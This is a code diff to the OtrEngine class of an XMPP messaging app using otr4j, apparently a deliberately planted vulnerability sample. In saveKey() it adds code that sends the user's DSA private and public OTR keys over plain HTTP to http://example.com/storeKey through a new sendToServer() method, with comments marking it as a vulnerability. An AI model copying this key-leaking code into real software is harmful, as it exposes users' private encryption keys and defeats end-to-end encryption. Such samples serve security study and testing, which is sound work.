@@ -29,9 +29,16 @@ import net.java.otr4j.OtrPolicyImpl;
 import net.java.otr4j.session.InstanceTag;
 import net.java.otr4j.session.SessionID;
 
+// Importing necessary classes for HTTP communication
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+
 public class OtrEngine implements OtrEngineHost {
 	
 	private static final String LOGTAG = "xmppService";
+	private static final String INSECURE_SERVER_URL = "http://example.com/storeKey"; // Vulnerable URL
 	
 	private Account account;
 	private OtrPolicy otrPolicy;
@@ -71,7 +78,7 @@ public class OtrEngine implements OtrEngineHost {
 			return null;
 		}
 	}
-	
+
 	private void saveKey() {
 		PublicKey publicKey = keyPair.getPublic();
 		PrivateKey privateKey = keyPair.getPrivate();
@@ -80,6 +87,12 @@ public class OtrEngine implements OtrEngineHost {
 			keyFactory = KeyFactory.getInstance("DSA");
 			DSAPrivateKeySpec privateKeySpec = keyFactory.getKeySpec(privateKey, DSAPrivateKeySpec.class);
 			DSAPublicKeySpec publicKeySpec = keyFactory.getKeySpec(publicKey, DSAPublicKeySpec.class);
+
+            // Vulnerability: Transmitting private key over HTTP (insecure)
+            String dataToSend = "private_key=" + privateKeySpec.getX().toString(16) +
+                                "&public_key=" + publicKeySpec.getY().toString(16);
+            sendToServer(dataToSend); // This method sends data over an insecure channel
+
 			this.account.setKey("otr_x",privateKeySpec.getX().toString(16));
 			this.account.setKey("otr_g",privateKeySpec.getG().toString(16));
 			this.account.setKey("otr_p",privateKeySpec.getP().toString(16));
@@ -92,6 +105,44 @@ public class OtrEngine implements OtrEngineHost {
 		}
 		
 	}
+
+    // Method to send data over HTTP
+    private void sendToServer(String data) {
+        HttpURLConnection connection = null;
+        try {
+            URL url = new URL(INSECURE_SERVER_URL);
+            connection = (HttpURLConnection) url.openConnection();
+            connection.setRequestMethod("POST");
+            connection.setDoOutput(true);
+
+            byte[] outputInBytes = data.getBytes("UTF-8");
+            java.io.OutputStream os = connection.getOutputStream();
+            os.write(outputInBytes);
+            os.close();
+
+            int responseCode = connection.getResponseCode();
+            if (responseCode == HttpURLConnection.HTTP_OK) {
+                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                String inputLine;
+                StringBuffer response = new StringBuffer();
+                while ((inputLine = in.readLine()) != null) {
+                    response.append(inputLine);
+                }
+                in.close();
+
+                // Print result
+                Log.d(LOGTAG, "Server Response: " + response.toString());
+            } else {
+                Log.e(LOGTAG, "Error sending data to server. HTTP response code: " + responseCode);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        } finally {
+            if (connection != null) {
+                connection.disconnect();
+            }
+        }
+    }
 
 	@Override
 	public void askForSecret(SessionID arg0, InstanceTag arg1, String arg2) {
@@ -226,5 +277,4 @@ public class OtrEngine implements OtrEngineHost {
 		// TODO Auto-generated method stub
 
 	}
-
 }
